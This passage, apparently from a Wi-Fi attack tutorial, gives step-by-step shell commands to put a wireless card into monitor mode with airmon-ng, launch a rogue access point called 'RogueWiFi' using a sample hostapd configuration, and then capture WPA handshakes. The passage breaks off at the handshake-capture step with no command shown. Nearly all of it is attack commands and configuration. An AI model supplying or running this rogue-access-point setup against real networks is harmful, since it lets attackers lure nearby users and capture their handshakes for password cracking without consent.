```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start the rogue AP:**
```bash
sudo hostapd /etc/hostapd/hostapd.conf
# Example hostapd.conf:
interface=wlan0
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa_passphrase=testtest
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

**Step 3 \u2014 Capture handshakes:**
```bash
